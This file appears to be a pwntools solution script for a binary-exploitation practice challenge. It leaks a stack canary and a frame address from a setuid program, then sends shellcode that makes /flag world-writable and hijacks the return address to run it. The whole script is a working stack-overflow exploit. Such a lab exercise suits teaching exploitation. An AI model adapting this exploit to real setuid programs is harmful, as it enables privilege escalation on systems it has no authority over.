import re
import sys
import pwn


pwn.context.arch = "amd64"
pwn.context.os = "linux"


def tee[T: pwn.tube](process: T) -> T:
    orig_recv_raw = process.recv_raw
    output = sys.__stdout__.buffer  # type: ignore sys.stdout is replaced by pwn.term

    def recv_raw(numb, *args, **kwargs):
        data = orig_recv_raw(numb, *args, **kwargs) or b""  # orig may return str('')
        output.write(data)
        output.flush()
        return data

    process.recv_raw = recv_raw
    return process


def find_challenge(search_path="/challenge"):
    from pathlib import Path
    import os
    import stat

    xs = [
        str(f.absolute())
        for f in Path(search_path).iterdir()
        if f.is_file() and os.access(f, os.X_OK) and (f.stat().st_mode & stat.S_ISUID)
    ]
    if not xs:
        raise FileNotFoundError(f"No executable found in {search_path}")
    if len(xs) > 1:
        raise FileNotFoundError(f"Multiple executables found in {search_path}")
    return xs[0]


buffer_offset = 0x40
canary_offset = 0xA8
frames_offset = canary_offset + 8
return_offset = frames_offset + 8
frame_size = return_offset + 8

with tee(pwn.process(find_challenge())) as io:
    payload = bytearray(b" " * (canary_offset - buffer_offset))
    payload += b"\x01"
    payload[:6] = b"REPEAT"
    io.sendlineafter(b"Payload size:", str(len(payload)).encode())
    io.sendlineafter(b"Send your payload", payload)
    io.recvuntil(b"You said: ")
    if match := re.search(rb"\x01(.{7})", io.recvline()):
        canary = b"\x00" + match.group(1)
        pwn.success(f"Found canary: {canary.hex()}")
    else:
        pwn.error("Failed to find canary")

    payload = bytearray(b" " * (canary_offset - buffer_offset))
    payload += b"12345678"
    payload[:6] = b"REPEAT"
    io.sendlineafter(b"Payload size:", str(len(payload)).encode())
    io.sendlineafter(b"Send your payload", payload)
    io.recvuntil(b"You said: ")
    if match := re.search(rb"12345678(.{6,})", io.recvline()):
        last_frame_addr = pwn.u64(match.group(1).ljust(8, b"\x00"))
        pwn.success(f"Found last frame address: {last_frame_addr:#x}")
    else:
        pwn.error("Failed to find frame address")

    input_addr = (
        last_frame_addr - frame_size - frame_size - (frames_offset - buffer_offset)
    )
    pwn.success(f"Calculated input address: {input_addr:#x}")
    shellasm = pwn.shellcraft.chmod("/flag", 0o777)  # type: ignore
    shellasm = r"""
movabs rdi, 0x67616c662f
push rdi
push rsp
pop rdi    
push 0x1ff
pop rsi    
push 0x5a
pop rax    
syscall    
syscall    
"""
    shellcode = pwn.asm(shellasm)
    print(pwn.disasm(shellcode))
    print(pwn.hexdump(shellcode))
    assert len(shellcode) < canary_offset - buffer_offset, (
        "Shellcode is too large to fit in the buffer"
    )
    payload = [
        shellcode.ljust(canary_offset - buffer_offset, b"\x90"),
        canary,
        b"." * 8,
        (input_addr).to_bytes(8, "little"),
    ]
    payload = b"".join(payload)
    io.sendlineafter(b"Payload size:", str(len(payload)).encode())
    io.sendlineafter(b"Send your payload", payload)

    io.recvrepeat()
